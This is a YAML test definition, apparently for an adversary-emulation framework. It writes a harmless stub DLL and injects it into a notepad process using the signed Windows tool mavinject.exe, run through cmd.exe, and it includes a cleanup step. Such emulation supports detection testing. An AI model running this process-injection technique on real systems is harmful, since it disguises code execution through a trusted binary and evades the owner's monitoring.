    name: 'System Binary Proxy Execution: Mavinject'
  platforms:
    windows:
      psh:
        command: $dll = "$env:TEMP\cmd_stub.dll"; if (-not (Test-Path $dll)) { [System.IO.File]::WriteAllBytes($dll,
          [byte[]](77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0)) }; $proc = Start-Process
          notepad.exe -PassThru; cmd.exe /c "mavinject.exe $($proc.Id) /INJECTRUNNING
          $dll"; Write-Host "[+] Cmd-wrapped Mavinject process injection executed."
        cleanup: $dll = "$env:TEMP\cmd_stub.dll"; if (Test-Path $dll) { Remove-Item
          $dll -Force -ErrorAction SilentlyContinue }; Stop-Process -Name notepad
          -Force -ErrorAction SilentlyContinue; Write-Host "[+] Cleaned up cmd subshell
          artifacts."
